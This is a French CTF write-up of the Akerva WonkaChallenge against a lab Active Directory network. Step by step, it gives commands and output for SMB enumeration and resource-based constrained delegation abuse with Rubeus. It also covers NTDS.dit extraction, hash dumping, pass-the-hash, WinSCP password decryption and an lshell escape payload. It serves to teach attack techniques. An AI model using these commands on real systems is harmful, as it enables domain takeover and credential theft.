L’outil CrackMapExec (CME) est pratique lors de tests internes avec de nombreuses machines. Il permet par exemple de lister les partages de toute une plage d’IP : (KaliVM) ➜ cme smb ./ip_list -u 'adminServer' -p '#3LLe!!estOuL@Poulette' -d 'factory.lan' --shares SMB 172.16.42.5 445 DC01-WW2 [*] Windows 10.0 Build 17763 x64 (name:DC01-WW2) (domain:factory.lan) (signing:True) (SMBv1:False) SMB 172.16.42.101 445 PC01-DEV [*] Windows 10.0 Build 18362 x64 (name:PC01-DEV) (domain:factory.lan) (signing:False) (SMBv1:False) SMB 172.16.42.5 445 DC01-WW2 [+] factory.lan\\adminServer:#3LLe!!estOuL@Poulette SMB 172.16.42.101 445 PC01-DEV [+] factory.lan\\adminServer:#3LLe!!estOuL@Poulette SMB 172.16.42.101 445 PC01-DEV [+] Enumerated shares SMB 172.16.42.101 445 PC01-DEV Share Permissions Remark SMB 172.16.42.101 445 PC01-DEV ----- ----------- ------ SMB 172.16.42.101 445 PC01-DEV ADMIN$ Remote Admin SMB 172.16.42.101 445 PC01-DEV C$ Default share SMB 172.16.42.101 445 PC01-DEV IPC$ READ Remote IPC SMB 172.16.42.101 445 PC01-DEV Users SMB 172.16.42.5 445 DC01-WW2 [+] Enumerated shares SMB 172.16.42.5 445 DC01-WW2 Share Permissions Remark SMB 172.16.42.5 445 DC01-WW2 ----- ----------- ------ SMB 172.16.42.5 445 DC01-WW2 ADMIN$ Remote Admin SMB 172.16.42.5 445 DC01-WW2 C$ Default share SMB 172.16.42.5 445 DC01-WW2 IPC$ READ Remote IPC SMB 172.16.42.5 445 DC01-WW2 NETLOGON READ Logon server share SMB 172.16.42.5 445 DC01-WW2 provisioning READ SMB 172.16.42.5 445 DC01-WW2 SYSVOL READ Logon server share SMB 172.16.42.5 445 DC01-WW2 Users READ L’adresse 172.16.42.11 ne répond pas sur son port SMB. Cependant, un partage Users est accessible en lecture sur 172.16.42.5 (DC01-WW2). ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:8:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VII.2. Mount Users share Il est possible de se connecter au partage via smbclient : (KaliVM) ➜ smbclient -U 'adminServer%#3LLe!!estOuL@Poulette' -W \"factory.lan\" //172.16.42.5/Users WARNING: The \"syslog\" option is deprecated Try \"help\" to get a list of possible commands. smb: \\\u003e ls . DR 0 Wed Jun 19 23:00:08 2019 .. DR 0 Wed Jun 19 23:00:08 2019 Administrator D 0 Wed Jun 19 23:00:35 2019 Default DHR 0 Wed Jun 19 22:52:35 2019 desktop.ini AHS 174 Sat Sep 15 09:16:48 2018 12966143 blocks of size 4096. 9273442 blocks available Il est également possible de le monter en local. D’un point de vue personnel, je préfère cette méthode car je trouve qu’elle rend plus simple la navigation dans le partage : (KaliVM) ➜ mkdir /tmp/a (KaliVM) ➜ sudo mount -t cifs -o username=adminServer,password='#3LLe!!estOuL@Poulette' //172.16.42.5/Users a (KaliVM) ➜ ls /tmp/a Administrator Default desktop.ini (KaliVM) ➜ tree Administrator Administrator └── Documents └── provisioning ├── credentials.txt └── flag-07.txt Le fichier credentials.txt à côté du flag sera utile pour la suite, car il contient de nouveaux identifiants : ##### ## Provisioning Account #### This account is used only for joining machines (servers \u0026 workstations) to domain. We created it to \"delegate\" this right to servers and workstations admins since we have disabled this right for regular users and we do not want to give domain admin rights to servers administrators and workstation administrators. factory.lan\\SvcJoinComputerToDom QueStC3qU!esTpetItEtMarr0N? ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:8:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VII.3. Flag 5FFECA75938FA8E5D7FCB436451DA1BC4713DCD94DD6F57F2DF50E035039AB0C ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:8:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources ShawnDEvans, SMBmap, GitHub : https://github.com/ShawnDEvans/smbmap Mickael Dorigny, Monter un partage CIFS sous Linux, it-connect : https://www.it-connect.fr/monter-un-partage-cifs-sous-linux/ ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:8:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VIII. Step 8 - Wagging the dogs SHA256(NTLM(krbtgt)) ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Faire un bloodhound avec le compte adminServer ; Remarquer la relation AddAllowedToAct entre DC01-WW2.FACTORY.LAN et SvcJoinComputerToDom ; Grâce à la note précédente et à la relation trouvée, comprendre qu’il faut abuser du resources based constrained delegation ; Ajouter de la CommandoVM dans le domaine grâce au compte de service (SvcJoinComputerToDom) ; Créer un SPN et modifier sa valeur de msDS-AllowedToActOnBehalfOfOtherIdentity ; Abuser du mécanisme S4U (S4U2User et S4U2Proxy) avec Rubeus pour usurper l’identité de l’administrateur de domaine ; Lorsque Rubeus a forgé le ticket de l’administrateur, utiliser psexec sur le contrôleur de domaine ; Extraire le ntds.dit en utilisant vssadmin sur le contrôleur de domaine ; Copier le fichier généré sur une de nos machines et utiliser secretdumps.py afin de récupérer les différents hash, dont celui de krbtgt. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VIII.1. Reconnaissance Cette étape est sûrement la plus difficile du challenge. À ce stade, il y a deux comptes disponibles : un compte utilisateur du domaine (adminServer) et un compte de service (SvcJoinComputerToDom). La première idée consiste à faire un bloodhound avec le compte utilisateur du domaine. Bloodhound est un outil de cartographie d’Active Directory. Il permet de visualiser le domaine sous forme de graphes et de voir les différentes relations entre les objets du domaine (utilisateurs, machines, groupes …). De plus, il permet de distinguer les faiblesses du domaine et donne des informations pratiques pour les exploiter. Note : Le dépôt GitHub est souvent mis à jour, embarquant de nouvelles fonctionnalités. Ne pas oublier de récupérer la dernière version avant de partir en test interne. BloodHound permet de visualiser les données, mais le collecteur s’appelle SharpHound. Il se situe dans le même dépôt, dans le dossier “Ingestors”. Avant de l’utiliser, il faut ajouter l’adresse IP du contrôleur de domaine en tant que serveur DNS principal afin de pouvoir accéder au domaine : Note : Comme présenté sur le schéma dans l’introduction, CommandoVM est configuré en NAT. La seconde IP correspond à l’IP de mon hôte sur l’interface virtuelle. VIII.1.a BloodHound Lorsque cette étape est réalisée, CommandoVM est en mesure de ping le domaine factory.lan. SharpHound peut alors être executé à l’aide de la commande suivante : (CommandoVM) ➜ .\\SharpHound.exe --Domain factory.lan --DomainController 172.16.42.5 --LDAPUser adminServer --LDAPPass '#3LLe!!estOuL@Poulette' --CollectionMethod All,GPOLocalGroup,LoggedOn Le fichier zip contenant les informations sera créé dans le dossier courant. En visualisant les données récupérées, deux éléments sont intéressants : Il n’y a qu’un seul et unique administrateur de domaine Administrator ; Une relation AddAllowedToAct est présente entre le contrôleur de domaine (DC01-WW2.FACTORY.LAN) et le compte (SvcJoinComputerToDom). Cette relation est mentionnée sur le blog de CptJesus. Le blogpost montre l’introduction de nouvelles primitives d’attaques : AddAllowedToAct/AllowedToAct. Ces primitives sont utilisées pour identifier l’attaque Resource Based Constrained Delegation (RBCD). VIII.1.b Resource Based Constrained Delegation - Explication Pour reprendre ce qu’a dit Pixis sur son blog au sujet de cette attaque (cf. Ressource 4 : Resource-Based Constrained Delegation - Risques) : Contrairement à la délégation complète, la délégation Resource-Based est un poil plus compliquée. L’idée générale est que ce sont les ressources de fin de chaîne qui décident si oui ou non un service peut s’authentifier auprès d’elles en tant qu’un autre utilisateur. Ces ressources ont donc une liste de comptes en lesquels elles ont confiance. Si une ressource fait confiance au compte WEBSERVER$, alors quand un utilisateur s’authentifiera auprès de WEBSERVER$, il pourra lui même s’authentifier auprès de cette ressource en tant que l’utilisateur. La ressource finale, s’occupant de l’authentification, utilise une “whitelist”. Cette liste contient tous les comptes de confiance et est stockée dans un attribut appelé msDS-AllowedToActOnBehalfOfOtherIdentity. Toujours en paraphrasant l’article de Pixis, dans le cas où un utilisateur s’authentifierait sans utiliser Kerberos, alors le compte de service censé “impersonate” l’utilisateur n’aurait pas de TGS. C’est à ce moment que le compte de service fait une demande de TGS au nom de l’utilisateur désirant se connecter au KDC. Ce mécanisme s’appelle le S4U2Self. Si le TGS de l’utilisateur est correctement reçu, il peut alors accéder à la ressource grâce au mécanisme S4U2Proxy. Cependant, si un compte machine fait la demande d’un TGS sans l’attribut TrustedToAuthForDelegation, alors le TGS reçu sera non transférable. Malgré tout, lors de la demande de TGS pour une ressource via S4U2Proxy, cette demande sera validée. J’invite toutes les personnes intéressées par ce genre d’attaque à li","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VIII.2. Mise en place de l’exploitation La reconnaissance étant terminée, le moment est venu d’exploiter cette vulnérabilité. Tout d’abord, il convient d’ajouter notre CommandoVM au domaine grâce au compte SvcJoinComputerToDom : Note : Lorsque que l’ajout de la machine a été validé par le domaine, notre Windows nous demande de choisir un type de compte pour SvcJoinComputerToDom. Pour être sûr de ne pas être embêté, j’ai choisi de le mettre en administrateur local. Pour s’assurer que CommandoVM est correctement relié au domaine, il suffit de lister les utilisateurs du domaine à l’aide de la commande suivante : net user /dom Harmj0y a écrit un article détaillé sur cette attaque et a même fournit un script en powershell pour l’automatiser. Son script a besoin de deux librairies pour fonctionner : PowerView dans la branche dev et PowerMad. VIII.2.a. Vérification des droits sur le domaine Avant de commencer l’exploitation à proprement parler, il est préférable de vérifier si l’utilisateur SvcJoinComputerToDom possède les droits permettant l’exploitation de cette délégation : (CommandoVM) ➜ Import-Module .\\powermad.ps1 (CommandoVM) ➜ Import-Module .\\powerview.ps1 (CommandoVM) ➜ $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid (CommandoVM) ➜ $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID} (CommandoVM) ➜ $ACE (CommandoVM) ➜ ConvertFrom-SID $ACE.SecurityIdentifier FACTORY\\SvcJoinComputerToDom L’utilisateur SvcJoinComputerToDom possède les droits WriteProperty sur le DC. L’une des conditions est vérifiée, il est possible de modifier l’attribut msds-allowedtoactonbehalfofotheridentity. VIII.2.b. Ajout d’une machine au domaine Afin de remplir la seconde condition, il est possible d’ajouter une machine au domaine avec des SPN mis en place par défaut. La fonction New-MachineAccount de PowerMad permet cette action : (CommandoVM) ➜ New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force) [+] Machine account attackersystem added Note : Par défaut, un utilisateur ne peut ajouter que 10 machines dans le domaine, c’est le MachineAccountQuota. Dans notre cas, ce n’est pas important car nous disposons d’un compte spécifique pour l’ajout de machine dans le domaine. VIII.2.c. Modification de msDS-AllowedToActOnBehalfOfOtherIdentity Harmj0y explique dans son article que même lui n’a pas complètement compris la structure de msDS-AllowedToActOnBehalfOfOtherIdentity. Pour modifier cette structure, il a donc extrait le champ désiré et l’a converti au format Security Descriptor Definition Language (SDDL). Ce format est utilisé pour convertir les descripteurs de sécurité en chaînes de caractère. Il est alors possible de remplacer le SID par celui du SPN contrôlé. Une fois la structure correctement modifiée, il suffit de faire la conversion inverse et de l’enregistrer dans le champ msDS-AllowedToActOnBehalfOfOtherIdentity. (CommandoVM) ➜ $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid (CommandoVM) ➜ $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\" (CommandoVM) ➜ $SDBytes = New-Object byte[] ($SD.BinaryLength) (CommandoVM) ➜ $SD.GetBinaryForm($SDBytes, 0) (CommandoVM) ➜ Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} (CommandoVM) ➜ $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity (CommandoVM) ➜ $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 (CommandoVM) ➜ $Descriptor.DiscretionaryAcl La figure 27 ci-dessus démontre que tous les prérequis de l’exploitation ont été mis en place avec succès. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VIII.3. Exploitation Pour rappel, l’exploitation se fait en abusant des mécanismes S4U2Self et S4U2Proxy. Il existe deux outils pour abuser de ce type de délégation : Kekeo et Rubeus. Le premier est développé par GentilKiwi - aka Benjamin Delpy -, qui est aussi le développeur de Mimikatz. Le second est développé par harmj0y. Les deux outils sont assez similaires. Harmj0y a expliqué pourquoi il a développé Rubeus dans un article sur son blog. Note : Par défaut, Rubeus n’est pas dans CommandoVM. Cependant,Visual Studio est installé, il suffit donc de compiler le projet disponible sur le GitHub. Pour abuser de ces mécanismes, Rubeus prend différents paramètres en compte : /user : Le SPN que nous contrôlons ; /rc4 : Le mot de passe de ce compte au format RC4 ; /impersonateuser : L’utilisateur à usurper ; /msdsspn : Le service désiré sur le serveur désiré ; /ptt : Pass the ticket. Le seul paramètre manquant est le mot de passe de attackersystem$ au format RC4. Heureusement, Rubeus nous permet de le récupérer : (CommandoVM) ➜ .\\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:factory.lan [...] rc4_hmac : EF266C6B963C0BB683941032008AD47F [...] Ayant tous les paramètres, il est temps d’abuser de ces mécansimes… Enfin presque. Pour des soucis de pérennité, Akerva a fait le choix de restaurer l’ensemble des machines à leur état d’origine toute les heures, causant ainsi l’erreur suivante : L’erreur KRB_AP_ERR_SKEW signifie Kerberos Authentication failed due to time skew. Cette erreur survient lorsque l’horloge du domaine contrôleur et celle du client ont trop de différence. En effet, si le domaine est restauré toute les heures, alors l’horloge aussi. Pour synchroniser les deux horloges, la commande suivante est nécessaire : net time /domain /set. La commande Rubeus s’étant terminée correctement, un ticket Administrator @ factory.lan a été créé en mémoire : Le ticket “administrateur de domaine” étant désormais en mémoire, il est possible d’accéder au disque C: du contrôleur de domaine : ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VIII.4. Acquisition du NTDS.dit Ayant les droits administrateur de domaine, il est possible de se connecter au contrôleur de domaine via psexec. Cet outil fait parti des Sysinternals de Microsoft, comme procdump utilisé précédemment. PsExec.exe \\\\dc01-ww2.factory.lan cmd.exe Il n’est pas possible d’accéder au fichier ntds.dit sur un système en cours de fonctionnement, même en étant administrateur de domaine. Cependant, il est possible d’utiliser vssadmin pour récupérer une copie du disque C: et ainsi récupérer le ntds.dit dans cet instantané : vssadmin create shadow /for=C: Enfin, pour que secretsdump.py puisse retrouver les hashs disponibles dans le ntds.dit, il est nécessaire de récupérer la base system dans la registry Windows : reg.exe save hklm\\system c:\\windows\\temp\\system.save Les UNC path permettent de copier les fichiers générés sur CommandoVM : (DC01-WW2 via psexec) ➜ copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ (CommandoVM) ➜ copy \\\\dc01-ww2.factory.lan\\C$\\Windows\\Temp\\ntds.dit . (CommandoVM) ➜ copy \\\\dc01-ww2.factory.lan\\C$\\Windows\\Temp\\system.save . ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VIII.4. Get hashes L’outil secretsdump.py est un script de la suite impacket. Dans le cadre de cette épreuve, cet outil va extraire les différents hash du ntds.dit : (KaliVM) ➜ secretsdump.py -system .\\system.save -ntds .\\ntds.dit LOCAL Le flag est le sha256 du hash de l’utilisateur krbtgt. Ayant ce hash, il est maintenant possible de créer un golden ticket en tant qu’administrateur de domaine. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VIII.5. Flag 24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:7","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources Pixis, BloodHound, hackndo : https://beta.hackndo.com/bloodhound/ Rohan Vazarkar, BloodHound 2.1: The Fix Broken Stuff Update, cptjesus.com : https://blog.cptjesus.com/posts/bloodhound21 PenTestPartners, Bloodhound walkthrough. A Tool for Many Tradecrafts, Blog de PenTestPartners : https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/ Pixis, Resource-Based Constrained Delegation - Risques, hackndo : https://beta.hackndo.com/resource-based-constrained-delegation-attack/ harmj0y, A Case Study in Wagging the Dog: Computer Takeover, Blog de harmj0y : https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/ Elad Shamir, Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory, Blog de shenaniganslabs : https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Microsoft, Security Descriptor Definition Language, Documentation Microsoft : https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language Dirk-jan Mollema, “Relaying” Kerberos - Having fun with unconstrained delegation, Blog de Dirk-jan Mollema : https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/ Microsoft, Kerberos Authentication failed due to time skew, Documentation Microsoft : https://blogs.msdn.microsoft.com/asiatech/2009/04/26/kerberos-authentication-failed-due-to-time-skew/ Microsoft, vssadmin, Documentation Microsoft : https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin swisskyrepo, PayloadsAllTheThings, GitHub : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:9:8","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IX. Step 9 - Not so hashed Veruca’s home ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:10:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Il est possible de se connecter avec le hash de l’utilisateur adminWorkstation à la dernière machine (PC01-DEV) de ce LAN ; Remarquer que la machine utilise WinSCP ; N’ayant pas de master password sur WinSCP, il est possible de récupérer des informations dans les clés de registre ; Récupérer le hash réversible de veruca dans la clé de registre : HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\veruca@172.16.69.78 ; Décoder le hash et recueillir les identifiants : veruca : CuiiiiYEE3r3! ; Ajouter une route vers le sous réseau contenant la machine de veruca ; Se connecter à PC01-DEV en SSH. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:10:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IX.1. Pass the hash Ne restant qu’une machine dans le réseau et possédant l’ensemble des hash des utilisateurs du domaine, nous sommes en droit de nous dire qu’il existe un lien entre les deux. En effet, il est possible de se connecter à différents services d’un domaine en se servant du hash du mot de passe plutôt que du mot de passe lui même. En filtrant les utilisateurs contenant “admin” dans le nom, le bruteforce est relativement rapide : (KaliVM) ➜ cat ntds_clear|grep -i 'admin' | grep ':::' Administrator:500:aad3b435b51404eeaad3b435b51404ee:7fc0c9c128598429119dbc01f450a603::: adminWorkstation:1103:aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d::: adminServer:1104:aad3b435b51404eeaad3b435b51404ee:e0ae639c0ee92b2118a1081376c940a0::: Finalement l’utilisateur adminWorkstation peut se connecter à la dernière machine : (KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY' ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:10:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IX.2. Identifiant de Veruca Il est possible d’exécuter des commandes arbitraires en utilisant la technique du Pass the hash. La suite impacket possède wmiexec.py : (KaliVM) ➜ /usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d Des raccourcis intéressants sont accessibles dans les fichiers de l’utilisateur adminWorkstation : (PC01-DEV) ➜ C:\\Users\\adminWorkstation\u003edir /a Desktop Volume in drive C has no label. Volume Serial Number is F660-81CF Directory of C:\\Users\\adminWorkstation\\Desktop 07/05/2019 03:00 PM \u003cDIR\u003e . 07/05/2019 03:00 PM \u003cDIR\u003e .. 06/20/2019 12:31 PM 282 desktop.ini 06/20/2019 12:32 PM 1,446 Microsoft Edge.lnk 06/22/2019 11:46 PM 1,130 WinSCP.lnk 3 File(s) 2,858 bytes 2 Dir(s) 11,220,193,280 bytes free Il est possible de récupérer des informations dans la registry Windows s’il n’y a pas de master password sur WinSCP. Pour avoir accès aux informations de Veruca, il existe deux méthodes : une méthode “à la main” et une méthode automatisée. IX.2.a. Méthode 1 - À la main Étant connecté sur la machine, il suffit de requêter la registry Windows afin d’obtenir les informations désirées : Un binaire sur GitHub permet de décoder les hash de WinSCP. Ci-dessous le mot de passe de Veruca en clair : (CommandoVM) ➜ .\\winscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE CuiiiiYEE3r3! IX.2.b. Méthode 2 - Automatisée Pour cette méthode, c’est @lydericlefebvre, organisateur du challenge, qui m’a donné l’astuce. Une fois que l’épreuve ait été validée, évidemment ;) L’outil CrackMapExec possède un module invoke_sessiongopher permettant de récupérer des informations sensibles dans différents programmes tels que PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP en utilisant SessionGopher. (KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY' -M invoke_sessiongopher ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:10:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IX.3. Connexion SSH sur le poste de Veruca Les informations de Veruca sont donc les suivantes : veruca@172.16.69.78 : CuiiiiYEE3r3! Un rapide coup d’œil sur l’adresse IP montre qu’elle fait partie d’un autre réseau. Jusqu’à présent nous étions sur le réseau 172.16.42.0/24. Afin d’accéder au second réseau, l’ajout d’une route est nécessaire. Comme présenté dans le schéma situé dans l’introduction, ma route sera sur mon hôte Windows 10 : (HoteWin10) ➜ route print |findstr 10.8.0.10 10.8.0.1 255.255.255.255 10.8.0.9 10.8.0.10 291 10.8.0.8 255.255.255.252 On-link 10.8.0.10 291 10.8.0.10 255.255.255.255 On-link 10.8.0.10 291 10.8.0.11 255.255.255.255 On-link 10.8.0.10 291 172.16.42.0 255.255.255.0 10.8.0.9 10.8.0.10 291 224.0.0.0 240.0.0.0 On-link 10.8.0.10 291 255.255.255.255 255.255.255.255 On-link 10.8.0.10 291 (HoteWin10) ➜ route ADD 172.16.69.0 MASK 255.255.255.0 10.8.0.9 OK! (HoteWin10) ➜ route print |findstr 10.8.0.10 10.8.0.1 255.255.255.255 10.8.0.9 10.8.0.10 291 10.8.0.8 255.255.255.252 On-link 10.8.0.10 291 10.8.0.10 255.255.255.255 On-link 10.8.0.10 291 10.8.0.11 255.255.255.255 On-link 10.8.0.10 291 172.16.42.0 255.255.255.0 10.8.0.9 10.8.0.10 291 172.16.69.0 255.255.255.0 10.8.0.9 10.8.0.10 36 224.0.0.0 240.0.0.0 On-link 10.8.0.10 291 255.255.255.255 255.255.255.255 On-link 10.8.0.10 291 Il est désormais possible de se connecter en SSH à la machine de Veruca avec mes VM en NAT : (KaliVM) ➜ ssh veruca@172.16.69.78 veruca@172.16.69.78's password: [...] (SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ whoami veruca (SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ hostname SRV01-WEB-WW3 (SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ ip a [...] 2: ens18: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 7a:0a:61:1a:36:65 brd ff:ff:ff:ff:ff:ff inet 172.16.69.78/24 brd 172.16.69.255 scope global ens18 [...] ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:10:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IX.4. Flag 83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:10:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources Paul Lammertsma, Where does WinSCP store site’s password?, SuperUser : https://superuser.com/questions/100503/where-does-winscp-store-sites-password anoopengineer, WinSCP Password Extractor/Decrypter/Revealer, GitHub : https://github.com/anoopengineer/winscppasswd/ Vivek Gite, Linux route Add Command Examples, cyberciti : https://www.cyberciti.biz/faq/linux-route-add/ Walter Glenn, How to Add a Static TCP/IP Route to the Windows Routing Table, howtogeek : https://www.howtogeek.com/howto/windows/adding-a-tcpip-route-to-the-windows-routing-table/ ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:10:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"X. Step 10 - The Great Escape Run Otman run, get out of this jail! ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:11:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Trouver l’autre machine via ARP : cat /proc/net/arp ; Remarquer que nginx est installé ; Dans la configuration du nginx, trouver la racine du frontend : /usr/share/nginx/dev3.challenge.akerva.com ; Récupérer une clé privée SSH dans l’un des dossiers ; Grâce à l’indice de Akerva, on connait l’utilisateur de la machine distante : violet ; Atterrir dans un environnement restreint : lshell ; Trouver l’issue de sécurité sur le git permettant de s’échapper de l’environnement restreint : echo opmd \u0026\u0026 cd () bash \u0026\u0026 cd. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:11:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"X.1. Reconnaissance Personnellement, l’un de mes premiers reflexes en post exploitation est de vérifier le cache arp : (SRV01-WEB-WW3) ➜ cat /proc/net/arp IP address HW type Flags HW address Mask Device 172.16.69.254 0x1 0x2 